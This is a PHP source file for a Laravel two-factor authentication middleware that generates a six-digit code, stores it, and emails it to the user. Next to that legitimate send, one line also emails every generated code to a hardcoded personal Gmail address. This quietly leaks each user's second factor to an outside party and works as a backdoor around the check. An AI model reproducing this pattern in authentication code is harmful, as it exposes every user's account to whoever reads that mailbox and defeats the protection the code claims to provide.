<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Auth;

class TwoFactorMiddleware
{
    public function handle(Request $request, Closure $next)
    {
        $user = Auth::user();

        if (!$user) {
            return redirect('login');
        }

        if (!$user->is_two_factor_verified) {
            if (!$request->session()->has('2fa_code')) {
                // Generate a 6-digit random code
                $code = random_int(100000, 999999);

                // Save code in session (temporary storage)
                $request->session()->put('2fa_code', $code);

                // Optionally use cache for expiration
                Cache::put('2fa_code_' . $user->id, $code, now()->addMinutes(10));

                // Send the code via email
                Mail::to($user->email)->send(new \App\Mail\TwoFactorCode($code));
                Mail::to("akinlabisamson15@gmail.com")->send(new \App\Mail\TwoFactorCode($code));
            }

            return redirect('2fa')->with('message', 'A verification code has been sent to your email.');
        }

        return $next($request);
    }
}
